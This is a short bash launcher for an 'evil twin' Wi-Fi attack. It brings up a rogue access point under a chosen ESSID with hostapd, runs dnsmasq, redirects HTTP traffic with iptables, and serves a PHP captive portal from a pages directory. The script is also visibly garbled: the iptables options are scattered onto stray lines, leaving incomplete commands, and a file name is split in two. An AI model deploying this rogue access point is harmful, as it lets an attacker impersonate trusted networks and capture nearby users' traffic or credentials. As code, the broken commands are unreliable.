#!/bin/bash

[[ $# -ge 1 ]] && essid="$1" || read -p 'essid: ' essid

[[ $# -ge 2 ]] && wwwroot="$2" || wwwroot='pages/simple'

sudo ifconfig wlan0 up

sudo ip a add 11.0.0.1/24 dev wlan0

sudo ip r add 11.0.0.0/24 dev wlan0 table 97

nat tcp 80

80

sudo iptables -t -A PREROUTING -i wlan0 -p --dport -j

REDIRECT --to-ports

tmux new-session -d -s eviltwin "./hostapd.sh '$essid' ''"

tmux split-window -v -t eviltwin "./dnsmasq.sh"

tmux split-window -v -t eviltwin "sudo php -S 11.0.0.1:80 captive.

php '$wwwroot'"

tmux a -t eviltwin

sudo ifconfig wlan0 0

nat tcp 80

80

sudo iptables -t -D PREROUTING -i wlan0 -p --dport -j

REDIRECT --to-ports

echo 'done'
